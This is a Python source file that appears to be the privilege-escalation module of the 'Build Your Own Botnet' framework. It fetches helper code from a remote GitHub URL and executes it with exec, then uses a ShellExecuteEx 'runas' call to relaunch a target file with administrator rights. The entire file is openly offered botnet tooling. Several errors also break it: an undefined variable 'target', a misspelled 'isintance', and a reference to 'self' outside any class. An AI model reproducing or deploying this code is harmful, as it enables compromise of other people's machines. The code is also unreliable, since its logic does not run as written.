#!/usr/bin/python
# -*- coding: utf-8 -*-
'Escalate Privileges (Build Your Own Botnet)'

# standard library
import os
import imp
import sys
import ctypes
import urllib

# utilities
try:
    import util
except ImportError:
    util = imp.new_module('util')
    exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py')
    sys.modules['util'] = util

# globals
packages  = ['win32com.client']
platforms = ['win32']
usage     = 'escalate'
command   = True

# setup
util.is_compatible(platforms, __name__)
util.imports(packages)

# main
def run(filename):
    """ 
    Attempt to escalate privileges

    `Required`
    :param str target:    filename to run as administrator
    """
    try:
        if isintance(target, str) and os.path.isfile(target):
            if bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0):
                return "Current user has administrator privileges"
            else:
                if os.name == 'nt':
                    return win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(target))
                else:
                    return "Privilege escalation not yet available on '{}'".format(sys.platform)
        else:
            return "Error: argument 'target' must be a valid filename"
    except Exception as e:
        util.log("{} error: {}".format(self.escalate.func_name, str(e)))
